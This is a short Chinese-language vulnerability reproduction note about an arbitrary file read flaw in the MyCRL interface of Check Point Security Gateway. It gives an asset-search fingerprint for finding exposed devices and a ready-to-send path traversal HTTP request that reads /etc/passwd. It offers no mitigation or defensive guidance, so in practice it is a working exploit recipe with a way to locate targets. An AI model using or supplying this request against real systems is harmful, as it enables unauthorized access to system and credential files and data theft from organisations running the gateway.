# Check Point安全网关MyCRL存在任意文件读取漏洞

# 一、漏洞简介
  Check Point 安全网关是一种功能强大、可扩展的安全解决方案，旨在保护企业网络免受各种网络威胁和攻击它提供了多种安全功能，包括防火墙、虚拟专用网络（VPN）、入侵检测和预防系统（IDPS）、杂货邮件防护、网络地址转换（NAT）、负载均衡和安全信息和事件管理（SIEM）。这些功能使得Check Point 安全网关能够提供高性能、可扩展性和高度安全的保护，满足大型企业的需求。同时，Check Point 安全网关也提供了灵活的管理界面，易于配置和管理 ，Check Point 安全网关 MyCRL接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。

# 二、影响版本
+ Check Point安全网关

# 三、资产测绘
```plain
app="Check_Point-SSL-Network-Extender"
```

![1717150853799-cc0ca8e4-ecea-402e-8578-e8d88b708a16.png](./img/ig_1fSGctqaDq-Md/1717150853799-cc0ca8e4-ecea-402e-8578-e8d88b708a16-784297.png)

# 四、漏洞复现
```plain
GET /../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```

![1717150867186-710fd67f-6c19-424f-8c63-7244fa5fac38.png](./img/ig_1fSGctqaDq-Md/1717150867186-710fd67f-6c19-424f-8c63-7244fa5fac38-692802.png)



> 更新: 2024-06-01 11:17:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sa59vno6cykie36p>